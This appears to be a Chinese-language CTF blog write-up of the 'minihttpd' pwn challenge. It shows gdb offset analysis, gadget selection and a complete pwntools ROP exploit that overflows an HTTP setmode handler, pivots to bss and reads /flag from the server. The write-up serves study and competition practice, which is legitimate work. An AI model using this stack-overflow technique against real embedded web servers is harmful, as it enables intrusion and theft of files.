+<h2 id="minihttpd"><a href="#minihttpd" class="headerlink" title="minihttpd"></a>minihttpd</h2><p>这道题目是19届ciscn初赛pwn方向的题目在github上有存档，应该是iot固件程序漏洞改的题目，题目漏洞呢就是栈溢出</p>
+<h3 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a><strong>漏洞解析：</strong></h3><p>在0x427000这个sub_4270函数中是处理set_mode的，存在两处栈溢出</p>
+<p><img src="/../images/image-20260320155051227.png" alt="image-20260320155051227"></p>
+<h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p>那就先测试栈溢出需要填充的长度，此处用gdb调试</p>
+<blockquote>
+<p>开三个终端页面，一个启动程序执行.&#x2F;main</p>
+<p>一个用gdb监视命令 <code>gdb -q ./main -p &quot;$(pidof ./main | awk &#39;&#123;print $1&#125;&#39;)&quot; </code><br>这里可能监视失败需要执行这个 <code> echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p>
+<p>然后在另一个终端中运行127.0.0.1的测试脚本后就可以在gdb页面进行调试了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>(<span class="params">body, content_length</span>):</span><br><span class="line">    http_erq = <span class="string">b&quot;POST /setmode HTTP/1.1\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Host: 127.0.0.1:9999\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(content_length).encode() + <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += body</span><br><span class="line">    p.send(http_erq)</span><br><span class="line"></span><br><span class="line">body = <span class="string">b&quot;setmode=&quot;</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span></span><br><span class="line">curl(body, <span class="built_in">len</span>(body))</span><br><span class="line"></span><br><span class="line">resp = p.recv()</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>
+
+<p>启动后直接断在<code>0x402B5A</code>然后n一下，如下图：<br><img src="/../images/image-20260320160909693.png" alt="image-20260320160909693"></p>
+<p>然后就可以计算栈溢出的长度了</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rsp     0x7ffff7bfe040 —▸ 0x7ffff7bfe4b0 ◂— <span class="string">&#x27;setmode=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">01:0008│-448     0x7ffff7bfe048 ◂— 0x400000028 /* <span class="string">&#x27;(&#x27;</span> */</span><br><span class="line">02:0010│ rax rdi 0x7ffff7bfe050 ◂— <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">... ↓            3 skipped</span><br><span class="line">06:0030│-420     0x7ffff7bfe070 ◂— 0</span><br><span class="line">07:0038│-418     0x7ffff7bfe078 ◂— 0</span><br><span class="line">pwndbg&gt;</span><br><span class="line">08:0040│-410 0x7ffff7bfe080 ◂— 0</span><br><span class="line">... ↓     7 skipped</span><br><span class="line">pwndbg&gt; p/x <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$1</span> = 0x7ffff7bfe490</span><br><span class="line">pwndbg&gt; p/x <span class="variable">$rbp</span>-<span class="variable">$rdi</span></span><br><span class="line"><span class="variable">$2</span> = 0x440</span><br><span class="line">pwndbg&gt; p/d 0x440</span><br><span class="line"><span class="variable">$4</span> = 1088</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在测试一下新的长度，然后就可以发现成功覆盖到rbp和rbp+8的地方</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>(<span class="params">body, content_length</span>):</span><br><span class="line">    http_erq = <span class="string">b&quot;POST /setmode HTTP/1.1\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Host: 127.0.0.1:9999\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(content_length).encode() + <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += body</span><br><span class="line">    p.send(http_erq)</span><br><span class="line"></span><br><span class="line">body = <span class="string">b&quot;setmode=&quot;</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">0x440</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&quot;C&quot;</span>*<span class="number">8</span></span><br><span class="line">curl(body, <span class="built_in">len</span>(body))</span><br><span class="line"></span><br><span class="line">resp = p.recv()</span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure>
+
+<h3 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h3><p>然后就要考虑攻击思路了，首先要明确运行.&#x2F;main的那个终端页面，打远程的时候是在服务端的，这就造成了ret2libc的做法泄露出来的libc地址我们是接收不到，间接的说明了泄露libc打orw可能有一定的问题，ret2libc也不行那就只能看看代码段上有没有能利用的汇编代码片段也就是gadget，那就先查一下这道题目的gadgets，可以看到给的挺多的。</p>
+<p><img src="/../images/image-20260320161543885.png" alt="image-20260320161543885"></p>
+<p>然后就在这看ida中的代码理清逻辑并查了一些资料，发现：</p>
+<ul>
+<li>程序中<code>sub_402663()</code>这个函数是读取文件的函数，我们控制了它的参数就可以读取服务器上的flag来<ul>
+<li>这就导致我们需要在程序bss段等地方写一个<code>/flag</code></li>
+</ul>
+</li>
+<li>recv()函数，我们可以劫持程序是服务端执行recv()函数接收字符<code>/flag</code></li>
+</ul>
+<p><code>recv()</code> 是 C 语言中用于从已连接套接字（TCP 或 UNIX domain socket）接收数据的函数。它属于 socket 编程的核心函数之一，定义在 <code>&lt;sys/socket.h&gt;</code> 头文件中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">recv</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sockfd</code></td>
+<td>套接字描述符，由 <code>socket()</code> 创建并通常通过 <code>connect()</code> 或 <code>accept()</code> 建立连接。</td>
+</tr>
+<tr>
+<td><code>buf</code></td>
+<td>指向接收数据缓冲区的指针，数据将存储于此。</td>
+</tr>
+<tr>
+<td><code>len</code></td>
+<td>缓冲区的大小（以字节为单位）。</td>
+</tr>
+<tr>
+<td><code>flags</code></td>
+<td>控制接收行为的标志，常用值包括：<br>• <code>0</code>：正常接收。<br>• <code>MSG_PEEK</code>：窥视数据，但不从系统缓冲区中移除。<br>• <code>MSG_WAITALL</code>：等待所有 <code>len</code> 字节数据才返回（但在某些情况下仍可能提前返回）。<br>• <code>MSG_DONTWAIT</code>：非阻塞操作，与设置套接字非阻塞类似。</td>
+</tr>
+</tbody></table>
+<p>问题又来了ROPgadget和ropper中没有查到可以控制rdx的gadget，虽然说程序执行到劫持的地方rdx是0x4c够用但容易崩，在程序中找到<code>0x401cf0</code>处的汇编代码调用了recv而且可以控制rdx此处还是0x4c（因为此处rax是0x4c且一直都没变）如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401CF0 B9 00 00 00 00                          mov     ecx, 0          ; flags</span><br><span class="line">.text:0000000000401CF5 48 89 C2                                mov     rdx, rax        ; n</span><br><span class="line">.text:0000000000401CF8 E8 23 F6 FF FF                          call    _recv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20260320163752481.png" alt="image-20260320163752481"></p>
+<p>就是这个东西的长度，此处也是处理set_mode的函数里面</p>
+<p>在这里理一下思路：</p>
+<ul>
+<li>通过溢出控制程序执行流</li>
+<li>第一步：recv( 4, bss, 0x4c )使<code>/flag\x00\x00\x00</code>写在程序bss段上</li>
+<li>第二部：调用<code>sub_402663()</code>这里用<code>read_file()</code>代替，调用这个函数read_file( 4, bss)</li>
+<li>那么我们就要让程序跳转到bss段上执行read_file( 4, bss);这就需要leave ret;来完成，所以程序rbp覆盖为bss地址即可</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最终exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span> )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>(<span class="params">body, content_length</span>):</span><br><span class="line">    http_erq = <span class="string">b&quot;POST /setmode HTTP/1.1\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Host: 127.0.0.1:9999\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(content_length).encode() + <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += <span class="string">b&quot;\r\n&quot;</span> </span><br><span class="line">    http_erq += body</span><br><span class="line">    p.send(http_erq)</span><br><span class="line"></span><br><span class="line">recv_plt = elf.plt[<span class="string">&#x27;recv&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000402ff3</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000402ff1</span></span><br><span class="line">start_routine_recv = <span class="number">0x401cf0</span></span><br><span class="line">bss = <span class="number">0x427000</span></span><br><span class="line">read_file = <span class="number">0x402663</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #body = b&quot;setmode=&quot; + b&quot;A&quot;*1088 + b&quot;B&quot;*8 +b&quot;C&quot;*8</span></span><br><span class="line"><span class="comment"># #recv(4, bss, 0x4c) rdx在劫持处的默认值是0x4c够用</span></span><br><span class="line"><span class="comment"># body = b&quot;setmode=&quot; + b&quot;A&quot;*1088 + p64(bss) + p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(pop_rdi + 1) + p64(recv_plt)</span></span><br><span class="line"><span class="comment"># #read_file(4, bss=&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;/flag\x00\x00\x00&#x27;+p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_file)</span></span><br><span class="line"><span class="comment"># curl(body+payload, len(body))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#新</span></span><br><span class="line">stage1 = <span class="string">b&quot;setmode=&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">0x440</span> + p64(bss)</span><br><span class="line">stage1 += p64(pop_rsi_r15) + p64(bss) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">4</span>) + p64(pop_rdi + <span class="number">1</span>) + p64(start_routine_recv)</span><br><span class="line">stage2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span> + p64(pop_rsi_r15) + p64(bss) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">4</span>) + p64(read_file)</span><br><span class="line">curl(stage1 + stage2, <span class="built_in">len</span>(stage1))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<p>注意事项：</p>
+<ul>
+<li>tcp通信打包的长度是第一段的长度，然后第二段写在bss上，通过leave ret是程序跳转到bss段执行</li>
+<li>p64(pop_rdi + 1) + p64(recv_plt) 这个相当于ret recv;也相当于call recv。但是并不能替代 start_routine_recv 这里的call _recv</li>
+</ul>
+<h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><p>这道题目仿照的真实漏洞场景中的代码，</p>
+<p>首先就是在找到漏洞后先搞明白怎么进入漏洞，</p>
+<p>然后我们要有耐心的分析代码，尽力为所有函数命名，</p>
+<p>最后呢，其实如果写过这样的代码很快就明白怎么进行到漏洞点，并且呢程序有什么甚至可以猜测到，最简单的就比如说这个http协议很快就能直接写出来这个def curl()的函数，如果不懂还得搞半天就比如这次套rtsp协议的拿到题目没一点办法，</p>
+<p>拓展到真实漏洞挖掘中我们要不仅能够发现漏洞逻辑，而且呢要有耐心的把他们的业务逻辑代码给看明白。</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-289689.htm#msg_header_h2_1">easy_rw的详细解析，就是那个关于套rtsp协议的题目的wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>leon
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://le0n-daily.github.io/awdp/" title="awdp-pwn-patch技巧+一些题目">https://le0n-daily.github.io/awdp/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/en" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/awdp/" rel="tag"># awdp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" rel="prev" title="2025年度总结： 致敬过去，展望未来">
+                  <i class="fa fa-angle-left"></i> 2025年度总结： 致敬过去，展望未来
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/" rel="next" title="数据结构代码实现">
+                  数据结构代码实现 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">leon</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">689k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">10:26</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
